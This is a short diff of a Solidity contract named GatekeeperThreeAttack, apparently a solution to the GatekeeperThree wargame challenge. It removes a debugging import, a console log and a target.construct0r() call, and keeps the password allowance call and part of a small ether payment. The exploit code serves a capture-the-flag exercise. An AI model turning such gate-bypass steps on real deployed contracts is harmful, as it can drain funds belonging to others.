@@ -1,8 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import {Test, console} from "forge-std/Test.sol";
-
 import "./GatekeeperThree.sol";
 
 contract GatekeeperThreeAttack {
@@ -13,9 +11,6 @@ contract GatekeeperThreeAttack {
     }
 
     function run(uint256 password) public payable {
-        console.log(msg.sender);
-        target.construct0r();
-
         target.getAllowance(password);
 
         uint256 amount = 0.001 ether + 1 wei;
